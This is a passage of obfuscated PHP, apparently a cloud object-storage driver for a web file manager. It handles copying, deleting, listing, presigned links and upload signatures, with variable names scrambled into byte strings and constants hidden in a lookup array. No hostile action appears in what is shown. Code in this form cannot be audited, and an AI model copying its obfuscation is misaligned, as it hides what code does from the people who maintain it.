$ÎÁ¤•Ü‰ = $this->objectMeta($ğôÔ«÷Ë); if (!$ÎÁ¤•Ü‰) { return !1; } if ($ÎÁ¤•Ü‰[$»ÆÎ§äø[79]] <= 1024 * 1024 * 200) { $è§‘µÌÙ = $this->client->copyObject($this->bucket, $ğôÔ«÷Ë, $this->bucket, $ÄÂ’ä¿, $»ÆÎ§äø[231], $³ÇÆÉÊ); } else { $è§‘µÌÙ = $this->client->multiCopyObject($this->bucket, $ğôÔ«÷Ë, $this->bucket, $ÄÂ’ä¿, $³ÇÆÉÊ); } $è§‘µÌÙ = $è§‘µÌÙ ? $this->getPathOuter($ÄÂ’ä¿) : !1; return $è§‘µÌÙ; } public function moveFile($Šğ†«éû, $Òºôã¹ö) { if ($this->copyFile($Šğ†«éû, $Òºôã¹ö)) { $this->delFile($Šğ†«éû); return $this->getPathOuter($Òºôã¹ö); } return !1; } public function delFile($äÈ„Ôİ) { return $this->client->deleteObject($this->bucket, $äÈ„Ôİ); } public function delFolder($öïÌÑÎÂ) { $Ê¼ê¼Ğ =& $_SERVER[Š—Â“œÔ]; if (!$this->exist($öïÌÑÎÂ)) { return !0; } $this->listItemCache = !1; $Ëßä¯É€ = $this->fileList($öïÌÑÎÂ); $this->listItemCache = !0; $¬¡œ´¹ = trim($öïÌÑÎÂ, $Ê¼ê¼Ğ[8]) . $Ê¼ê¼Ğ[8]; if (!empty($öïÌÑÎÂ) && $öïÌÑÎÂ !== $Ê¼ê¼Ğ[230] && !in_array($¬¡œ´¹, $Ëßä¯É€[$Ê¼ê¼Ğ[85]])) { $Ëßä¯É€[$Ê¼ê¼Ğ[85]][] = $¬¡œ´¹; } $¨•Ù‹ = $this->delByBatch($Ëßä¯É€[$Ê¼ê¼Ğ[86]]); if (!$¨•Ù‹) { return !1; } $¨•Ù‹ = $this->delByBatch($Ëßä¯É€[$Ê¼ê¼Ğ[85]]); if (!$¨•Ù‹) { return !1; } return $this->delFile($¬¡œ´¹); } private function delByBatch($œÎì¶„¬) { foreach (array_chunk($œÎì¶„¬, 1000) as $¦Õƒë˜â) { $Æ‚ƒ¨…ã = $this->client->deleteObjects($this->bucket, $¦Õƒë˜â); if (!$Æ‚ƒ¨…ã) { return !1; } } return !0; } public function rename($§êÔ©¼, $á¦¥·İ¡) { return $this->renameObject($§êÔ©¼, $á¦¥·İ¡); } public function listPath($Ÿï™¾ïÉ, $–ş«´†Ô = false) { $ˆÙÍ·ç =& $_SERVER[Š—Â“œÔ]; $ÆßÙ¡ÄÆ = $this->fileList($Ÿï™¾ïÉ, $ˆÙÍ·ç[8], !0); foreach ($ÆßÙ¡ÄÆ[$ˆÙÍ·ç[85]] as $Á§ÆªÑ¡ => $›íİùÎ’) { $ÆßÙ¡ÄÆ[$ˆÙÍ·ç[85]][$Á§ÆªÑ¡] = $this->folderInfo($›íİùÎ’, $–ş«´†Ô, $›íİùÎ’); } foreach ($ÆßÙ¡ÄÆ[$ˆÙÍ·ç[86]] as $Á§ÆªÑ¡ => $›íİùÎ’) { $ÆßÙ¡ÄÆ[$ˆÙÍ·ç[86]][$Á§ÆªÑ¡] = $this->fileInfo($›íİùÎ’[$ˆÙÍ·ç[32]], $–ş«´†Ô, $›íİùÎ’); } return $ÆßÙ¡ÄÆ; } protected function infoChildren($º‚Ù˜Õ‘, &$àûõä¶á) { $‹åå˜ª =& $_SERVER[Š—Â“œÔ]; $¡¿µºÚ¢ = $this->fileList($º‚Ù˜Õ‘, $‹åå˜ª[12], !0); $àûõä¶á[$‹åå˜ª[81]] += count($¡¿µºÚ¢[$‹åå˜ª[85]]); $àûõä¶á[$‹åå˜ª[80]] += count($¡¿µºÚ¢[$‹åå˜ª[86]]); foreach ($¡¿µºÚ¢[$‹åå˜ª[86]] as $ãÜ¢»ÕÖ) { if (!$ãÜ¢»ÕÖ || !$ãÜ¢»ÕÖ[$‹åå˜ª[79]]) { continue; } $àûõä¶á[$‹åå˜ª[79]] += $ãÜ¢»ÕÖ[$‹åå˜ª[79]]; } } private function fileInfo($¥µìÚï‘, $•†˜ãÏ = false, $‘”³Œ°É = array()) { $ñ­ª÷£ß =& $_SERVER[Š—Â“œÔ]; $”…ë¸Âæ = array($ñ­ª÷£ß[32] => $this->pathThis($¥µìÚï‘), $ñ­ª÷£ß[87] => $this->getPathOuter($¥µìÚï‘), $ñ­ª÷£ß[33] => $ñ­ª÷£ß[232], $ñ­ª÷£ß[169] => $this->ext($¥µìÚï‘), $ñ­ª÷£ß[79] => isset($‘”³Œ°É[$ñ­ª÷£ß[79]]) ? $‘”³Œ°É[$ñ­ª÷£ß[79]] : 0); if ($•†˜ãÏ) { return $”…ë¸Âæ; } $”…ë¸Âæ[$ñ­ª÷£ß[233]] = $”…ë¸Âæ[$ñ­ª÷£ß[88]] = 0; $”…ë¸Âæ[$ñ­ª÷£ß[234]] = $”…ë¸Âæ[$ñ­ª÷£ß[235]] = !0; if (empty($‘”³Œ°É)) { $‘”³Œ°É = $this->objectMeta($¥µìÚï‘); if (!$‘”³Œ°É) { return $”…ë¸Âæ; } } if (isset($‘”³Œ°É[$ñ­ª÷£ß[236]]) && $‘”³Œ°É[$ñ­ª÷£ß[236]]) { $”…ë¸Âæ[$ñ­ª÷£ß[237]] = $‘”³Œ°É[$ñ­ª÷£ß[236]]; } if (isset($‘”³Œ°É[$ñ­ª÷£ß[206]])) { $”…ë¸Âæ[$ñ­ª÷£ß[88]] = $‘”³Œ°É[$ñ­ª÷£ß[206]]; } if (isset($‘”³Œ°É[$ñ­ª÷£ß[79]])) { $”…ë¸Âæ[$ñ­ª÷£ß[79]] = $‘”³Œ°É[$ñ­ª÷£ß[79]]; } return $”…ë¸Âæ; } private function folderInfo($ı˜¶Œøˆ, $ÒÊ‚ö³ò = false, $…ŸÈ»şË = array()) { $Å®Ôõ“Ù =& $_SERVER[Š—Â“œÔ]; $­©ÓßÁ = array($Å®Ôõ“Ù[32] => $this->pathThis($ı˜¶Œøˆ), $Å®Ôõ“Ù[87] => $this->getPathOuter($Å®Ôõ“Ù[8] . $ı˜¶Œøˆ), $Å®Ôõ“Ù[33] => $Å®Ôõ“Ù[78]); if ($ÒÊ‚ö³ò) { return $­©ÓßÁ; } $­©ÓßÁ[$Å®Ôõ“Ù[233]] = $­©ÓßÁ[$Å®Ôõ“Ù[88]] = 0; $­©ÓßÁ[$Å®Ôõ“Ù[234]] = $­©ÓßÁ[$Å®Ôõ“Ù[235]] = !0; if ($ı˜¶Œøˆ == $Å®Ôõ“Ù[12]) { return $­©ÓßÁ; } if (empty($…ŸÈ»şË)) { $…ŸÈ»şË = $this->objectMeta(trim($ı˜¶Œøˆ, $Å®Ôõ“Ù[8]) . $Å®Ôõ“Ù[8]); } if (isset($…ŸÈ»şË[$Å®Ôõ“Ù[206]])) { $­©ÓßÁ[$Å®Ôõ“Ù[233]] = $…ŸÈ»şË[$Å®Ôõ“Ù[206]]; } return $­©ÓßÁ; } private function fileList($®‡ñ«±Æ, $‰¶…Ïûã = '', $«ˆÄ­Ë× = 0) { $¦Ü‹òÁ– =& $_SERVER[Š—Â“œÔ]; $¦Äšç = rtrim($®‡ñ«±Æ, $¦Ü‹òÁ–[8]) . $¦Ü‹òÁ–[8]; $£ã®í” = $this->listObjs($¦Äšç, null, null, $‰¶…Ïûã); if (!$£ã®í”) { return array($¦Ü‹òÁ–[85] => array(), $¦Ü‹òÁ–[86] => array()); } $–˜•ê°ø = $›àŸŠ£ = array(); foreach ($£ã®í”[$¦Ü‹òÁ–[238]] as $’Û” Ë) { $ìàíÆçÌ = $’Û” Ë[$¦Ü‹òÁ–[32]]; if ($ìàíÆçÌ == $¦Äšç) { continue; } $Ã¿Ë¨¸Ô = isset($’Û” Ë[$¦Ü‹òÁ–[79]]) ? $’Û” Ë[$¦Ü‹òÁ–[79]] : 0; $Êàï°Ì¬ = $Ã¿Ë¨¸Ô == 0 && substr($ìàíÆçÌ, strlen($ìàíÆçÌ) - 1, 1) == $¦Ü‹òÁ–[8] ? !0 : !1; $this->cacheMethodInfoSet($ìàíÆçÌ, $Êàï°Ì¬, $’Û” Ë); if ($Êàï°Ì¬) { $–˜•ê°ø[] = $ìàíÆçÌ; continue; } $›àŸŠ£[] = $«ˆÄ­Ë× ? $’Û” Ë : $ìàíÆçÌ; } foreach ($£ã®í”[$¦Ü‹òÁ–[239]] as $’Û” Ë) { $–˜•ê°ø[] = $’Û” Ë[$¦Ü‹òÁ–[32]]; $this->cacheMethodInfoSet($’Û” Ë[$¦Ü‹òÁ–[32]], !0); } $this->cacheMethodInfoSet($®‡ñ«±Æ, !0); return array($¦Ü‹òÁ–[85] => $–˜•ê°ø, $¦Ü‹òÁ–[86] => $›àŸŠ£); } private function listObjs($…¨å¦ˆù, $î—ÜŞÜ– = null, $”Å«ÇúÒ = null, $Ú‚‰”èÒ = null) { $…Ù•î´ =& $_SERVER[Š—Â“œÔ]; $…¨å¦ˆù = trim($…¨å¦ˆù, $…Ù•î´[8]); $ê€Äê‚à = empty($…¨å¦ˆù) && $…¨å¦ˆù !== $…Ù•î´[230] ? $…Ù•î´[12] : $…¨å¦ˆù . $…Ù•î´[8]; return $this->client->getBucket($this->bucket, $ê€Äê‚à, $î—ÜŞÜ–, $”Å«ÇúÒ, $Ú‚‰”èÒ, !0); } public function has($©€‰â¦ö, $İ¶óã = false, $¨¯•²Î£ = true) { $åä¬ =& $_SERVER[Š—Â“œÔ]; $©€‰â¦ö = trim($©€‰â¦ö, $åä¬[8]); $ºÃı¶¦¥ = empty($©€‰â¦ö) && $©€‰â¦ö !== $åä¬[230] ? $åä¬[12] : $©€‰â¦ö . $åä¬[8]; $ÄìÕ“šã = null; $Ñ»“èãå = 500; $ÊÄæı»˜ = $åä¬[8]; $ö÷Ï ­ = $¯˜Õê” = array(); while (!0) { $ëÑ½–†± = $this->listObjs($©€‰â¦ö, $ÄìÕ“šã, $Ñ»“èãå, $ÊÄæı»˜); if (!$ëÑ½–†±) { break; } $ÄìÕ“šã = $ëÑ½–†±[$åä¬[240]]; $°òñŞÔ = $ëÑ½–†±[$åä¬[238]]; $¡İƒ¥–ı = $ëÑ½–†±[$åä¬[239]]; if (empty($°òñŞÔ) && empty($¡İƒ¥–ı)) { break; } if (count($°òñŞÔ) == 1 && $°òñŞÔ[0][$åä¬[32]] == $ºÃı¶¦¥) { break; } if ($İ¶óã) { if (count($°òñŞÔ)) { $°òñŞÔ = array_column($°òñŞÔ, $åä¬[32]); $ö÷Ï ­ = array_merge($ö÷Ï ­, $°òñŞÔ); } if (count($¡İƒ¥–ı)) { $¡İƒ¥–ı = array_column($¡İƒ¥–ı, $åä¬[32]); $¯˜Õê” = array_merge($¯˜Õê”, $¡İƒ¥–ı); } if ($ÄìÕ“šã === null) { break; } continue; } if ($¨¯•²Î£) { if (!empty($°òñŞÔ)) { if (count($°òñŞÔ) > 1 || isset($°òñŞÔ[0][$åä¬[32]]) && $°òñŞÔ[0][$åä¬[32]] != $ºÃı¶¦¥) { return !0; } } } else { if (!empty($¡İƒ¥–ı)) { return !0; } } if ($ÄìÕ“šã === null) { break; } } if ($İ¶óã) { $ö÷Ï ­ = array_diff($ö÷Ï ­, array($ºÃı¶¦¥)); $ö÷Ï ­ = count(array_unique($ö÷Ï ­)); $¯˜Õê” = count(array_unique($¯˜Õê”)); return array($åä¬[241] => $ö÷Ï ­, $åä¬[242] => $¯˜Õê”); } return !1; } public function listAll($•ŞÉü¬) { $õ£îèöÑ =& $_SERVER[Š—Â“œÔ]; $ÈÎÅÚ‡¼ = $this->fileList($•ŞÉü¬, $õ£îèöÑ[12], !0); $‚œş÷™Ğ = array_to_keyvalue($ÈÎÅÚ‡¼[$õ£îèöÑ[86]], $õ£îèöÑ[32]); foreach ($ÈÎÅÚ‡¼[$õ£îèöÑ[85]] as $¶©óÈÀ×) { if (is_string($¶©óÈÀ×)) { $‚œş÷™Ğ[$¶©óÈÀ×] = array($õ£îèöÑ[79] => 0); } } return $this->listAllFiles($•ŞÉü¬, $‚œş÷™Ğ); } public function canRead($ê¡Û§Ö¢) { $’Ş†Ú¼” =& $_SERVER[Š—Â“œÔ]; $øû¦óé = $this->client->getAccessControlPolicy($this->bucket, $ê¡Û§Ö¢); if (!$øû¦óé) { return !1; } return in_array($øû¦óé, array($’Ş†Ú¼”[243], $’Ş†Ú¼”[244], $’Ş†Ú¼”[245])) ? !0 : !1; } public function canWrite($°ßë‡êè) { $ë§öÃËş =& $_SERVER[Š—Â“œÔ]; $ìÉïˆë° = $this->client->getAccessControlPolicy($this->bucket, $°ßë‡êè); if (!$ìÉïˆë°) { return !1; } return in_array($ìÉïˆë°, array($ë§öÃËş[243], $ë§öÃËş[244])) ? !0 : !1; } public function getContent($¦š¤Äæµ) { return $this->client->getObject($this->bucket, $¦š¤Äæµ); } public function setContent($¿àÁê™, $¬‚®ñ®ä = '', $®ƒåìš = false) { $ÕØÉ‰Ù­ =& $_SERVER[Š—Â“œÔ]; $¿àÁê™ = $®ƒåìš ? trim($¿àÁê™, $ÕØÉ‰Ù­[8]) . $ÕØÉ‰Ù­[8] : $¿àÁê™; $‰¿Ñ§Âù = get_file_mime(get_path_ext($¿àÁê™)); $¢´¡íÀ› = $this->client->putObject($¬‚®ñ®ä, $this->bucket, $¿àÁê™, $ÕØÉ‰Ù­[231], array(), $‰¿Ñ§Âù); if (!$¢´¡íÀ›) { return !1; } if ($®ƒåìš) { return !0; } return $¢´¡íÀ› ? !0 : !1; } public function fileSubstr($€ı·×ô¸, $„µ¾âçÁ, $¢ÌÙ¯Òß) { $ò½É¼®Ø = $„µ¾âçÁ + $¢ÌÙ¯Òß - 1; return $this->client->getObject($this->bucket, $€ı·×ô¸, array($_SERVER[Š—Â“œÔ][246] => "\x62\x79\164\x65\x73\x3d{$„µ¾âçÁ}\x2d{$ò½É¼®Ø}")); } public function upload($‡Ÿ”õğÀ, $Í‹Ï¶ó, $€Ä¢ßŒî = false, $¯äŒÕ = REPEAT_REPLACE) { $€‘‹š•€ =& $_SERVER[Š—Â“œÔ]; $ÌÁ¶£“Œ = array($€‘‹š•€[247] => @md5_file($Í‹Ï¶ó)); $ö™£¸Û² = array($€‘‹š•€[248] => get_file_mime(get_path_ext($‡Ÿ”õğÀ))); if (IO::size($Í‹Ï¶ó) <= 1024 * 1024 * 200) { $¹Ø£ŞàÅ = $this->client->putObjectFile($Í‹Ï¶ó, $this->bucket, $‡Ÿ”õğÀ, $€‘‹š•€[231], $ÌÁ¶£“Œ, $ö™£¸Û²); return !empty($¹Ø£ŞàÅ) ? $this->getPathOuter($‡Ÿ”õğÀ) : !1; } $åÙæ®¢ = $this->client->multiUploadObject($Í‹Ï¶ó, $this->bucket, trim($‡Ÿ”õğÀ, $€‘‹š•€[8]), $ÌÁ¶£“Œ, $ö™£¸Û²); return $åÙæ®¢ ? $this->getPathOuter($‡Ÿ”õğÀ) : !1; } public function download($È¦ ´ŒÙ, $ÁÌÚô‚) { if (!@is_dir($this->pathFather($ÁÌÚô‚)) && !IO::mkdir($this->pathFather($ÁÌÚô‚))) { return !1; } $ÏÁ—Œß® = $this->client->getObject($this->bucket, $È¦ ´ŒÙ, array(), $ÁÌÚô‚); return $ÏÁ—Œß® !== !1 ? $ÁÌÚô‚ : !1; } public function link($ÏúæÇé¡, $‰Ú’Èş– = array()) { return $this->getPreSignedURL($ÏúæÇé¡, 3600 * 12, $‰Ú’Èş–); } private function getPreSignedURL($ó¶Ó‚ û, $ÖŸëÅßú, $Ûµ‡¾×´ = array(), $Ê×”¥»Õ = "\107\x45\x54") { $Ïáïˆ¾™ =& $_SERVER[Š—Â“œÔ]; $ó¶Ó‚ û = trim($ó¶Ó‚ û, $Ïáïˆ¾™[8]); if ($this->signVer == $Ïáïˆ¾™[249]) { return $this->client->getPreSignedV2URL($this->bucket, $ó¶Ó‚ û, $ÖŸëÅßú, $Ê×”¥»Õ, $Ûµ‡¾×´); } return $this->client->getPreSignedV4URL($this->bucket, $ó¶Ó‚ û, $ÖŸëÅßú, array(), $Ê×”¥»Õ, $Ûµ‡¾×´); } public function fileOut($Ô‰£¨Í¢, $‘Â¢…ı» = false, $±ÒÆš» = false, $­±üÎğ = '') { $†æÚš¦Ú =& $_SERVER[Š—Â“œÔ]; if ($this->isFileOutServer()) { return $this->fileOutServer($Ô‰£¨Í¢, $‘Â¢…ı», $±ÒÆš», $­±üÎğ); } if (!$±ÒÆš») { $±ÒÆš» = $this->pathThis($Ô‰£¨Í¢); } $‡öèıÁ· = get_file_mime(get_path_ext($±ÒÆš»)); if ($‡öèıÁ· == $†æÚš¦Ú[250]) { return parent::fileOut($Ô‰£¨Í¢, $‘Â¢…ı», $±ÒÆš», $­±üÎğ); } $š÷¹©Í„ = array($†æÚš¦Ú[251] => $‡öèıÁ·); if ($‘Â¢…ı») { $š÷¹©Í„[$†æÚš¦Ú[252]] = $†æÚš¦Ú[253] . rawurlencode($±ÒÆš»); } else { } $şş‹¤Ôô = $this->link($Ô‰£¨Í¢, $š÷¹©Í„); $this->fileOutLink($şş‹¤Ôô); } public function fileOutServer($ÑÄçÌ¥˜, $é›­´¿‡ = false, $®Ïã†Ú… = false, $Ñ¨Ï›¯® = '') { parent::fileOut($ÑÄçÌ¥˜, $é›­´¿‡, $®Ïã†Ú…, $Ñ¨Ï›¯®); } public function fileOutImageServer($ §ö¹‡Ø, $ãø¯¾Ş = 250) { parent::fileOutImage($ §ö¹‡Ø, $ãø¯¾Ş); } public function hashMd5($øØÂÈÔñ, $ÂÁşŞì… = '') { $®¬¸èÚ = $this->objectMeta($øØÂÈÔñ); if (!$®¬¸èÚ) { return !1; } $ÂÁşŞì… = $ÂÁşŞì… ? $ÂÁşŞì… : _get($®¬¸èÚ, $_SERVER[Š—Â“œÔ][254]); return $ÂÁşŞì…; } public function uploadFormData($¨‡Ëã¶, $âµ÷ıœ¹ = 3600) { $õ½÷Ûåı =& $_SERVER[Š—Â“œÔ]; if (!$this->_isClientAsync()) { $€Ò±½Æ = $this->getPreSignedURL($¨‡Ëã¶, $âµ÷ıœ¹, array(), $õ½÷Ûåı[255]); return array($õ½÷Ûåı[208] => str_replace($õ½÷Ûåı[218], $õ½÷Ûåı[256], $€Ò±½Æ)); } if (isset($GLOBALS[$õ½÷Ûåı[6]][$õ½÷Ûåı[92]][$õ½÷Ûåı[257]]) && $GLOBALS[$õ½÷Ûåı[6]][$õ½÷Ûåı[92]][$õ½÷Ûåı[257]] == $õ½÷Ûåı[230]) { return $this->uploadMultiData($¨‡Ëã¶, $âµ÷ıœ¹); } if ($this->signVer == $õ½÷Ûåı[249]) { return $this->uploadFormDataV2($¨‡Ëã¶, $âµ÷ıœ¹); } return $this->uploadFormDataV4($¨‡Ëã¶, $âµ÷ıœ¹); } public function uploadFormDataV2($Ñô¢è³, $ğÆ¥ñÅ = 3600) { $¦™Õ×Ñ‡ =& $_SERVER[Š—Â“œÔ]; $’´É·ÃÏ = $this->pathFather($Ñô¢è³); $ÏâÆñÔè = $this->client->getHttpUploadPostParams($this->bucket, $’´É·ÃÏ, $¦™Õ×Ñ‡[231], $ğÆ¥ñÅ); $ ’àµ”ç = array_merge((array) $ÏâÆñÔè, array($¦™Õ×Ñ‡[258] => $¦™Õ×Ñ‡[249], $¦™Õ×Ñ‡[208] => $this->getHost())); if ($this->_isClientAsync()) { unset($ ’àµ”ç[$¦™Õ×Ñ‡[258]]); } return $ ’àµ”ç; } public function uploadFormDataV4($šØ‰¥½‡, $¿ìç¢‚  = 3600) { $Úï¢ïøé =& $_SERVER[Š—Â“œÔ]; $œÕáóËÁ = $Úï¢ïøé[231]; $êøçÆ¯ = $Úï¢ïøé[259]; $×åë×õ¶ = $Úï¢ïøé[62]; $ÓŒöâÅÁ = gmdate($Úï¢ïøé[260]); $³İ›À‡Ğ = gmdate($Úï¢ïøé[261]); $ú»†ì ë = $Úï¢ïøé[262]; $®ÍÁ¢Ó° = $¿ìç¢‚  . $Úï¢ïøé[12]; $ƒôú… = $Úï¢ïøé[263]; $ƒ³İ€€Œ = array($this->accessKey, $³İ›À‡Ğ, $this->region, $×åë×õ¶, $ú»†ì ë); $¤õËÈ˜• = implode($Úï¢ïøé[8], $ƒ³İ€€Œ); $Á¢â¦Õ = array($Úï¢ïøé[264] => gmdate($Úï¢ïøé[265], strtotime($Úï¢ïøé[266])), $Úï¢ïøé[267] => array(array($Úï¢ïøé[268] => $this->bucket), array($Úï¢ïøé[269], $Úï¢ïøé[270], $Úï¢ïøé[12]), array($Úï¢ïøé[269], $Úï¢ïøé[271], $Úï¢ïøé[12]), array($Úï¢ïøé[272] => $ƒôú…), array($Úï¢ïøé[273] => $¤õËÈ˜•), array($Úï¢ïøé[274] => $êøçÆ¯), array($Úï¢ïøé[275] => $ÓŒöâÅÁ), array($Úï¢ïøé[276] => $®ÍÁ¢Ó°))); $¯Ñô„£› = base64_encode(json_encode($Á¢â¦Õ)); $şÀ¼¶ = hash_hmac($Úï¢ïøé[277], $³İ›À‡Ğ, $Úï¢ïøé[278] . $this->secret, !0); $üı‹Ø‹” = hash_hmac($Úï¢ïøé[277], $this->region, $şÀ¼¶, !0); $ûæŞÕÍÌ = hash_hmac($Úï¢ïøé[277], $×åë×õ¶, $üı‹Ø‹”, !0); $øÇèÎ¾ö = hash_hmac($Úï¢ïøé[277], $ú»†ì ë, $ûæŞÕÍÌ, !0); $‰ºËÍı = hash_hmac($Úï¢ïøé[277], $¯Ñô„£›, $øÇèÎ¾ö); $Î‹ığñ = array($Úï¢ïøé[248] => $Úï¢ïøé[12], $Úï¢ïøé[272] => $ƒôú…, $Úï¢ïøé[279] => $¯Ñô„£›, $Úï¢ïøé[273] => $¤õËÈ˜•, $Úï¢ïøé[274] => $êøçÆ¯, $Úï¢ïøé[275] => $ÓŒöâÅÁ, $Úï¢ïøé[276] => $®ÍÁ¢Ó°, $Úï¢ïøé[280] => $‰ºËÍı, $Úï¢ïøé[258] => $Úï¢ïøé[249], $Úï¢ïøé[208] => $this->getHost()); if ($this->_isClientAsync()) { unset($Î‹ığñ[$Úï¢ïøé[258]]); } return $Î‹ığñ; } public function uploadMultiData($êÄ¤Æéˆ, $ŠÌæÒ¿† = 3600) { $Ü¹ı¹Š¹ =& $_SERVER[Š—Â“œÔ]; $š†Ó”ó = $this->signVer == $Ü¹ı¹Š¹[249] ? gmdate($Ü¹ı¹Š¹[281]) : gmdate($Ü¹ı¹Š¹[282]); $ŞÆ¶°¥ı = array(); $€µÇí¨ø = $this->client->getUploadId($this->bucket, $êÄ¤Æéˆ, $ŞÆ¶°¥ı); if (!$€µÇí¨ø) { return !1; } $£ÈĞ®º = array($Ü¹ı¹Š¹[283] => $€µÇí¨ø, $Ü¹ı¹Š¹[208] => $this->getHost() . $Ü¹ı¹Š¹[8] . $this->pathEncode($êÄ¤Æéˆ), $Ü¹ı¹Š¹[284] => $š†Ó”ó, $Ü¹ı¹Š¹[97] => $êÄ¤Æéˆ, $Ü¹ı¹Š¹[258] => $this->signVer); if ($this->_isClientAsync()) { unset($£ÈĞ®º[$Ü¹ı¹Š¹[258]]); } return $£ÈĞ®º; } public function uploadMultiAuth($€ÕÃÈ¹ç, $½ÎŒÖÔ = array()) { $ÈØ¿Ë´Ó =& $_SERVER[Š—Â“œÔ]; if ($this->signVer == $ÈØ¿Ë´Ó[249]) { if (isset($½ÎŒÖÔ[$ÈØ¿Ë´Ó[285]])) { return $this->uploadPartAuthV2($€ÕÃÈ¹ç, $½ÎŒÖÔ); } return $this->uploadListAuthV2($€ÕÃÈ¹ç, $½ÎŒÖÔ); } if (isset($½ÎŒÖÔ[$ÈØ¿Ë´Ó[285]])) { return $this->uploadPartAuthV4($€ÕÃÈ¹ç, $½ÎŒÖÔ); } return $this->uploadListAuthV4($€ÕÃÈ¹ç, $½ÎŒÖÔ); } public function uploadPartAuthV2($´†±Í¹Â, $ä¤Ôú¡• = array()) { $ñ˜àº¨Í =& $_SERVER[Š—Â“œÔ]; $æÈãå = $ä¤Ôú¡•[$ñ˜àº¨Í[97]]; $ªˆââ˜‰ = gmdate($ñ˜àº¨Í[281]); $§Ã–äíò = array_intersect_key($ä¤Ôú¡•, array_flip(array($ñ˜àº¨Í[285], $ñ˜àº¨Í[283]))); ksort($§Ã–äíò); $”Ô°÷¥ü = $§Ã–äíò ? $ñ˜àº¨Í[76] . http_build_query($§Ã–äíò, null, $ñ˜àº¨Í[286], PHP_QUERY_RFC3986) : $ñ˜àº¨Í[12]; $Î‘Ùùå› = array($ñ˜àº¨Í[255], $ñ˜àº¨Í[12], $ñ˜àº¨Í[123], $ñ˜àº¨Í[12], "\170\55\141\x6d\172\55\144\141\x74\x65\72{$ªˆââ˜‰}", $ñ˜àº¨Í[8] . $this->bucket . $ñ˜àº¨Í[8] . $this->pathEncode($æÈãå) . $”Ô°÷¥ü); $êæÍ•Şø = implode($ñ˜àº¨Í[287], $Î‘Ùùå›); $çÏçŠ÷Î = $this->client->__getSignature($êæÍ•Şø); return array($ñ˜àº¨Í[288] => $çÏçŠ÷Î, $ñ˜àº¨Í[284] => $ªˆââ˜‰); } public function uploadListAuthV2($©Ìˆ›º‘, $úÖµ‘¶ß = array()) { $ÒıãÛ¶ =& $_SERVER[Š—Â“œÔ]; $“˜áÈÙ = $úÖµ‘¶ß[$ÒıãÛ¶[97]]; $ßÌ—äÍ¿ = $úÖµ‘¶ß[$ÒıãÛ¶[283]]; $‰‚ËÂ… = $this->client->listParts($this->bucket, $“˜áÈÙ, $ßÌ—äÍ¿); if (!$‰‚ËÂ…) { return !1; } $¼‚õÀ˜º = gmdate($ÒıãÛ¶[281]); $£ºùêû = $ÒıãÛ¶[289] . $ßÌ—äÍ¿; $ÂêâŸ‘¾ = array($ÒıãÛ¶[290], $ÒıãÛ¶[12], $ÒıãÛ¶[123], $ÒıãÛ¶[12], "\x78\55\x61\x6d\x7a\55\144\141\x74\145\x3a{$¼‚õÀ˜º}", $ÒıãÛ¶[8] . $this->bucket . $ÒıãÛ¶[8] . $this->pathEncode($“˜áÈÙ) . $£ºùêû); $»õ€¨”Ì = implode($ÒıãÛ¶[287], $ÂêâŸ‘¾); $êş‰§Œ¼ = $this->client->__getSignature($»õ€¨”Ì); return array($ÒıãÛ¶[288] => $êş‰§Œ¼, $ÒıãÛ¶[284] => $¼‚õÀ˜º, $ÒıãÛ¶[291] => $‰‚ËÂ…); } public function uploadPartAuthV4($èİ‘«îé, $‡ö¦ÓÌ£ = array()) { $ÁÅ§‚‹± =& $_SERVER[Š—Â“œÔ]; $ˆ¥¥ş»ú = $‡ö¦ÓÌ£[$ÁÅ§‚‹±[97]]; $ãèÜÄÔù = array($ÁÅ§‚‹±[275] => gmdate($ÁÅ§‚‹±[282]), $ÁÅ§‚‹±[292] => _get($‡ö¦ÓÌ£, $ÁÅ§‚‹±[293], hash($ÁÅ§‚‹±[277], $ÁÅ§‚‹±[12]))); $ŸË¼Ç–Ô = explode($ÁÅ§‚‹±[210], $this->getHost()); $ß”‡Ù™ = array($ÁÅ§‚‹±[294] => $ŸË¼Ç–Ô[1], $ÁÅ§‚‹±[295] => $ÁÅ§‚‹±[12], $ÁÅ§‚‹±[248] => $ÁÅ§‚‹±[123], $ÁÅ§‚‹±[296] => $‡ö¦ÓÌ£[$ÁÅ§‚‹±[79]]); $¤Ì±ï–İ = $ÁÅ§‚‹±[255]; $®üŒ†Ò« = $ÁÅ§‚‹±[8] . $this->pathEncode($ˆ¥¥ş»ú); $Æ¦§ÀöÄ = array_intersect_key($‡ö¦ÓÌ£, array_flip(array($ÁÅ§‚‹±[285], $ÁÅ§‚‹±[283]))); $ØÚÌäºÙ = $this->client->__getSignatureV4($ãèÜÄÔù, $ß”‡Ù™, $¤Ì±ï–İ, $®üŒ†Ò«, $Æ¦§ÀöÄ); return array($ÁÅ§‚‹±[288] => $ØÚÌäºÙ, $ÁÅ§‚‹±[292] => $ãèÜÄÔù[$ÁÅ§‚‹±[292]], $ÁÅ§‚‹±[284] => $ãèÜÄÔù[$ÁÅ§‚‹±[275]]); } public function uploadListAuthV4($ÈÈÂÜğ¡, $ø˜¬¾ÖÍ = array()) { $Ïƒ½« =& $_SERVER[Š—Â“œÔ]; $®¼ïøú = $ø˜¬¾ÖÍ[$Ïƒ½«[97]]; $¯ïøÃÚÔ = $ø˜¬¾ÖÍ[$Ïƒ½«[283]]; $ÜÁš±Ä = $this->client->listParts($this->bucket, $®¼ïøú, $¯ïøÃÚÔ); if (!$ÜÁš±Ä) { return !1; } $ııœÑ  = $Ïƒ½«[297]; foreach ($ÜÁš±Ä as $ßÜşÁˆß) { $ııœÑ  .= $Ïƒ½«[298] . "\74\x50\x61\162\x74\116\x75\x6d\x62\x65\x72\x3e{$ßÜşÁˆß[$Ïƒ½«[299]]}\74\x2f\x50\x61\162\x74\x4e\165\155\x62\145\x72\x3e\xa" . "\74\105\124\x61\x67\x3e{$ßÜşÁˆß[$Ïƒ½«[300]]}\x3c\57\x45\124\141\x67\x3e\12" . $Ïƒ½«[301]; } $ııœÑ  .= $Ïƒ½«[302]; $ñÁà±Š‘ = array($Ïƒ½«[275] => gmdate($Ïƒ½«[282]), $Ïƒ½«[292] => hash($Ïƒ½«[277], $ııœÑ )); $ÛÚ¢êİ = explode($Ïƒ½«[210], $this->getHost()); $ô­©™â = array($Ïƒ½«[294] => $ÛÚ¢êİ[1], $Ïƒ½«[248] => $Ïƒ½«[123], $Ïƒ½«[296] => strlen($ııœÑ )); $¾·êŞèÏ = $Ïƒ½«[290]; $ü‹ÚÂ¦ = $Ïƒ½«[8] . $this->pathEncode($®¼ïøú); $¸¥¥Ò¨ = array($Ïƒ½«[283] => $¯ïøÃÚÔ); $•€æÍ÷ = 